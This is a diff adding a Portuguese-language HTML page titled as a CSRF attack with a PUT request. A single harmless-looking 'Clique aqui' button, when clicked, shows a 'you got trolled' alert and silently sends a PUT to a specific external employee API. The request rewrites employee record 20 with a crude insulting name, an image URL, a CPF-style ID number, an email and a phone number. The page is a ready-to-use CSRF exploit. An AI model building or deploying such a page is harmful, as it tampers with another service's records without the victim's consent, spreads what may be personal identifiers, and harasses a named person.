@@ -1,0 +1,81 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>CSRF com Requisição PUT</title>
+  <style>
+    /* Centralizar o conteúdo da página */
+    body {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+      background-color: #f0f0f0;
+    }
+
+    /* Estilizar o botão */
+    #csrfForm {
+      padding: 15px 30px;
+      font-size: 18px;
+      background-color: #4CAF50; /* Cor do botão */
+      color: white;
+      border: none;
+      border-radius: 12px; /* Arredondar os cantos */
+      cursor: pointer;
+      transition: background-color 0.3s ease;
+    }
+
+    /* Efeito ao passar o mouse por cima */
+    #csrfForm:hover {
+      background-color: #45a049; /* Cor mais escura no hover */
+    }
+
+    /* Efeito ao clicar no botão */
+    #csrfForm:active {
+      background-color: #3e8e41; /* Cor mais escura ao clicar */
+    }
+  </style>
+</head>
+<body>
+  <!-- Um único botão visível para o usuário -->
+  <button id="csrfForm" onclick="sendPutRequest()">Clique aqui</button>
+
+  <script>
+    function sendPutRequest() {
+      // Exibe um alert para o usuário
+      alert('Você foi trolado!');
+
+      // Dados para a requisição PUT
+      const data = {
+        "id": "20",
+        "name": "Walid pica fina",
+        "picture": "https://i.ibb.co/JsnzHsy/a2488fe950bd.png",
+        "company_name": "TECH INNOVATIONS INCO.",
+        "cpf": "152.607.926-70",
+        "email": "teste7811@gmail.com",
+        "telephone": "11953233637",
+        "type_account": "E - RD",
+        "status_account": "ATIVO"
+      };
+
+      // Realiza a requisição PUT com o CSRF Token
+      fetch('https://urban-alison-magi-api-service-b274cdaa.koyeb.app/api/v1/employee/20', {
+        method: 'PUT',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify(data)
+      })
+      .then(response => response.json())
+      .then(data => {
+        console.log('Resposta da API:', data);
+      })
+      .catch((error) => {
+        console.error('Erro na requisição PUT:', error);
+      });
+    }
+  </script>
+</body>
+</html>
